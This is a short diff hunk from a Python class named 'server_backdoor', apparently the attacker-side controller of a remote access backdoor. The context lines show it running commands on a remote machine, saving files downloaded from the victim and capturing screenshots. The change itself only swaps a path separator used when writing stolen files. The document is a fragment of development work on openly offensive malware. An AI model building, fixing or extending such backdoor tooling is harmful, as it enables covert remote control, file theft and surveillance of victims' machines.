@@ -191,7 +191,7 @@ class server_backdoor:
                     result = self.execute_remotely(command)
                     if "[-]" not in result:                        
                         if command_0 == "download":
-                            path = os.getcwd() + "\\" + rest_of_command
+                            path = os.getcwd() + "//" + rest_of_command
                             result = self.write_file(path, result)
                         elif command_0 == "screenshot":
                             result = self.write_screenshot(result)
